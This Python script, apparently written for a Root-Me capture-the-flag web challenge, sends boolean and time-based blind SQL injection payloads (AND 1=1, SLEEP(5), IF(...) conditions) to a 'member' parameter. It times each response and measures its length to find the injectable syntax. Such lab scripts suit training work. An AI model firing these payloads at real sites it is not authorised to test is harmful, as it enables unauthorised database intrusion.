import requests
import time

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

def test_member_payload(payload):
    """Prueba payload en el parámetro member"""
    params = {
        "action": "member",
        "member": payload
    }
    inicio = time.time()
    try:
        r = requests.get(URL, params=params, cookies=COOKIE, timeout=30)
        tiempo = time.time() - inicio
        length = len(r.text)
        return tiempo, length
    except Exception as e:
        return 0, 0

print("="*70)
print("  PROBANDO CONDICIONES INVERTIDAS")
print("="*70)

# Baseline
t, l = test_member_payload("1")
print(f"Baseline: {t:.2f}s, Length: {l}")

print("\n[Condiciones TRUE vs FALSE]")
payloads = [
    ("1 AND 1=1", "TRUE"),
    ("1 AND 1=2", "FALSE"),
    ("1' AND '1'='1", "TRUE (con comillas)"),
    ("1' AND '1'='2", "FALSE (con comillas)"),
    ("1) AND (1=1", "TRUE (con paréntesis)"),
    ("1) AND (1=2", "FALSE (con paréntesis)"),
]

for payload, desc in payloads:
    t, l = test_member_payload(payload)
    print(f"{desc:25} -> {t:.2f}s, Length: {l}")
    time.sleep(0.3)

print("\n[Probando con SLEEP]")
sleep_payloads = [
    "1 AND SLEEP(5)",
    "1 AND SLEEP(5)-- -",
    "1' AND SLEEP(5)-- -",
    "1' OR SLEEP(5)-- -",
    "1' AND IF(1=1, SLEEP(5), 0)-- -",
    "1' AND IF(1=2, SLEEP(5), 0)-- -",  # Condición FALSE
    "1' OR IF(1=1, SLEEP(5), 0)-- -",
    "1' OR IF(1=2, SLEEP(5), 0)-- -",   # Condición FALSE
]

for payload in sleep_payloads:
    t, l = test_member_payload(payload)
    status = "🔴" if t > 2 else "🟢"
    print(f"{status} {payload[:40]:40} -> {t:.2f}s, Length: {l}")
    time.sleep(0.3)
